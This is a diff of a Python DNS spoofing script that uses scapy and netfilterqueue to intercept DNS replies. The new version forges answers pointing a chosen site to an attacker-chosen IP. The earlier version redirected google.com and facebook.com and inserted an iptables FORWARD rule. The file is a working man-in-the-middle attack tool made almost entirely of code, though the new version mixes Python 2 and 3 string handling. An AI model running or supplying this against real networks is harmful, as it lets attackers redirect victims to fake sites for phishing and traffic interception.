@@ -1,78 +1,48 @@
-from netfilterqueue import NetfilterQueue
+import netfilterqueue
 import scapy.all as scapy
-import os
+import optparse
 
-# DNS mapping records, feel free to add/modify this dictionary
-# for example, google.com will be redirected to 192.168.1.100
-dns_hosts = {
-    b"www.google.com.": "72.67.153.142",
-    b"google.com.": "72.67.153.142",
-    b"facebook.com.": "72.67.153.142"
-}
+site = ""
+target = ""
+
+def get_arguments():
+    global site, target
+
+    parser = optparse.OptionParser()
+    parser.add_option("-s", "--site", dest = "site", help = "Site to be spoofed.")
+    parser.add_option("-t", "--target", dest = "target", help = "Target.")
+    (options, arguments) = parser.parse_args()
+
+    if not options.site:
+        parser.error("[-] Please specify a site, use --help for more info.")
+    elif not options.target:
+        parser.error("[-] Please specify a target, use --help for more info.")
+
+    site = options.site
+    target = options.target
 
 def process_packet(packet):
-    """
-    Whenever a new packet is redirected to the netfilter queue,
-    this callback is called.
-    """
-    # convert netfilter queue packet to scapy packet
+    global site, target
+
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
-        # if the packet is a DNS Resource Record (DNS reply)
-        # modify the packet
-        print("[Before]:", scapy_packet.summary())
-        try:
-            scapy_packet = modify_packet(scapy_packet)
-        except IndexError:
-            # not UDP packet, this can be IPerror/UDPerror packets
-            pass
-        print("[After ]:", scapy_packet.summary())
-        # set back as netfilter queue packet
-        packet.set_payload(bytes(scapy_packet))
-    # accept the packet
+        qname = scapy_packet[scapy.DNSQR].qname
+        if site in qname:
+            print("\033[92m[+]\033[0m Spoofing target")
+            answer = scapy.DNSRR(rrname = qname, rdata = target)
+            scapy_packet[scapy.DNS].an = answer
+            scapy_packet[scapy.DNS].ancount = 1
+
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].chksum
+            del scapy_packet[scapy.UDP].len
+
+            packet.set_payload(str(scapy_packet))
+
     packet.accept()
 
-def modify_packet(packet):
-    """
-    Modifies the DNS Resource Record `packet` ( the answer part)
-    to map our globally defined `dns_hosts` dictionary.
-    For instance, whenever we see a google.com answer, this function replaces 
-    the real IP address (172.217.19.142) with fake IP address (192.168.1.100)
-    """
-    # get the DNS question name, the domain name
-    qname = packet[scapy.DNSQR].qname
-    if qname not in dns_hosts:
-        # if the website isn't in our record
-        # we don't wanna modify that
-        print("no modification:", qname)
-        return packet
-    # craft new answer, overriding the original
-    # setting the rdata for the IP we want to redirect (spoofed)
-    # for instance, google.com will be mapped to "192.168.1.100"
-    packet[scapy.DNS].an = scapy.DNSRR(rrname=qname, rdata=dns_hosts[qname])
-    # set the answer count to 1
-    packet[scapy.DNS].ancount = 1
-    # delete checksums and length of packet, because we have modified the packet
-    # new calculations are required ( scapy will do automatically )
-    del packet[scapy.IP].len
-    del packet[scapy.IP].chksum
-    del packet[scapy.UDP].len
-    del packet[scapy.UDP].chksum
-    # return the modified packet
-    return packet
-
-QUEUE_NUM = 0
-# insert the iptables FORWARD rule
-os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
-# instantiate the netfilter queue
-queue = NetfilterQueue()
-
-try:
-    # bind the queue number to our callback `process_packet`
-    # and start it
-    queue.bind(QUEUE_NUM, process_packet)
-    queue.run()
-except KeyboardInterrupt:
-    # if want to exit, make sure we
-    # remove that rule we just inserted, going back to normal.
-    os.system("iptables --flush")
+get_arguments()
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
